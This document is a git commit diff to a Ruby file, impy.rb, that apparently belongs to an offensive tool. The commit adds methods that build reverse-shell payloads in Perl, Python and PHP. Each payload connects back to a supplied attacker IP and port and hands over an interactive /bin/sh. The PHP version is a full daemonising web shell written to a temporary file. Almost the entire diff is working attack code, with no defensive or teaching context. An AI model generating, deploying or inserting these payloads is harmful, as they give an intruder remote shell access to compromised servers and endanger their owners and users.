efca76ab9e86e15f580b0a6694f4ca936af5d365
pry0cc <pry0cc@protonmail.com>
2019-02-20 14:04:20 +0000

    added mad stuff

--- impy.rb
+++ impy.rb
@@ -94,6 +94,99 @@ class Impy
         return base64
     end
 
+    def perlPayload(ip, port)
+        output = ""
+        good_ip = false
+        good_port = false
+
+        begin
+            test = IPAddr.new(ip)
+            good_ip = true
+        rescue => e
+            output += "Something went wrong with IP, #{e.to_s}\n"
+        end
+
+        begin
+            if port.to_i > 0 and port.to_i < 65535
+                good_port = true
+            else
+                output += "Port is invalid\n"
+            end
+        rescue => e
+            output += "Something went wrong with port #{e.to_}\n"
+        end
+        if good_ip and good_port
+            payload = "perl -e 'use Socket;$i=\"#{ip}\";$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+            output += payload
+        else
+            output += "Something is wrong with port or ip"
+        end
+        return output
+    end
+
+    def pythonPayload(ip, port)
+        output = ""
+        good_ip = false
+        good_port = false
+
+        begin
+            test = IPAddr.new(ip)
+            good_ip = true
+        rescue => e
+            output += "Something went wrong with IP, #{e.to_s}\n"
+        end
+
+        begin
+            if port.to_i > 0 and port.to_i < 65535
+                good_port = true
+            else
+                output += "Port is invalid\n"
+            end
+        rescue => e
+            output += "Something went wrong with port #{e.to_}\n"
+        end
+        if good_ip and good_port
+            payload = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+            output += payload
+        else
+            output += "Something is wrong with port or ip"
+        end
+        return output
+    end
+    def phpPayload(ip, port)
+        output = ""
+        good_ip = false
+        good_port = false
+
+        begin
+            test = IPAddr.new(ip)
+            good_ip = true
+        rescue => e
+            output += "Something went wrong with IP, #{e.to_s}\n"
+        end
+
+        begin
+            if port.to_i > 0 and port.to_i < 65535
+                good_port = true
+            else
+                output += "Port is invalid\n"
+            end
+        rescue => e
+            output += "Something went wrong with port #{e.to_}\n"
+        end
+        if good_ip and good_port
+            payload = "<?php set_time_limit(0);$VERSION=\"1.0\";$ip='#{ip}';$port=#{port};$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){printit(\"ERROR: Can't fork\");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit(\"Error: Can't setsid()\");exit(1);}$daemon=1;}else {printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}chdir(\"/\");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit(\"$errstr ($errno)\");exit(1);}$descriptorspec=array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit(\"ERROR: Can't spawn shell\");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit(\"Successfully opened reverse shell to $ip:$port\");while(1){if(feof($sock)){printit(\"ERROR: Shell connection terminated\");break;}if(feof($pipes[1])){printit(\"ERROR: Shell process terminated\");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug)printit(\"SOCK READ\");$input=fread($sock,$chunk_size);if($debug)printit(\"SOCK: $input\");fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){if($debug)printit(\"STDOUT READ\");$input=fread($pipes[1],$chunk_size);if($debug)printit(\"STDOUT: $input\");fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){if($debug)printit(\"STDERR READ\");$input=fread($pipes[2],$chunk_size);if($debug)printit(\"STDERR: $input\");fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print\"$string\\n\";}}?>"
+            
+            tmp = Tempfile.new(['shell', ".php"])
+            tmp.write(payload)
+            tmp.close()
+            output = File.open(tmp.path, "r")
+        else
+            output += "Something is wrong with port or ip"
+        end
+        return output
+    end
+
     def genPayload(ip, port)
         output = ""
 
